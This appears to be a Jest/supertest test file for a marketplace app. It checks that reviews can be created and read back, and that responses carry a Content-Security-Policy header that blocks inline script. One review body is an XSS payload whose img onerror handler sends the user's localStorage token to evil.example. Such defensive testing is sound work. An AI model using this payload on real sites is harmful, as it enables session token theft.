import request from 'supertest';
import mongoose from 'mongoose';
import { MongoMemoryServer } from 'mongodb-memory-server';
import app from '../../server/src/app.js';

let mongo;

beforeAll(async () => {
  process.env.JWT_SECRET = 'test-secret';
  process.env.JWT_EXPIRES_IN = '1h';
  mongo = await MongoMemoryServer.create();
  await mongoose.connect(mongo.getUri());
}, 60000);

afterAll(async () => {
  await mongoose.disconnect();
  if (mongo) await mongo.stop();
});

async function registerAndGetToken() {
  const res = await request(app)
    .post('/api/auth/register')
    .send({ name: 'Reviewer', email: `r${Date.now()}@test.dev`, password: 'secret123' });
  return res.body.token;
}

describe('Reviews API', () => {
  test('a logged-in user can create a review and it can be read back', async () => {
    const token = await registerAndGetToken();

    const listingRes = await request(app)
      .post('/api/listings')
      .set('Authorization', `Bearer ${token}`)
      .send({ title: 'Used bike', price: 50, category: 'other', condition: 'used' });
    expect(listingRes.status).toBe(201);
    const listingId = listingRes.body.listing._id;

    const payload =
      'Great seller! <img src=x onerror="fetch(\'//evil.example/?t=\' + localStorage.getItem(\'token\'))">';
    const createRes = await request(app)
      .post('/api/reviews')
      .set('Authorization', `Bearer ${token}`)
      .send({ listing: listingId, rating: 5, body: payload });
    expect(createRes.status).toBe(201);

    const listRes = await request(app).get('/api/reviews').query({ listing: listingId });
    expect(listRes.status).toBe(200);
    expect(listRes.body.reviews).toHaveLength(1);
  });
});

describe('Content-Security-Policy header', () => {
  test('responses send a CSP header', async () => {
    const res = await request(app).get('/api/health');
    expect(res.headers['content-security-policy']).toBeDefined();
  });

  test('the CSP restricts scripts to the same origin and blocks inline script', async () => {
    const res = await request(app).get('/api/health');
    const csp = res.headers['content-security-policy'] || '';

    // script-src is present and allows only 'self'
    expect(csp).toMatch(/script-src[^;]*'self'/);
    // and it must NOT permit inline script (which is how injected XSS runs)
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
  });
});
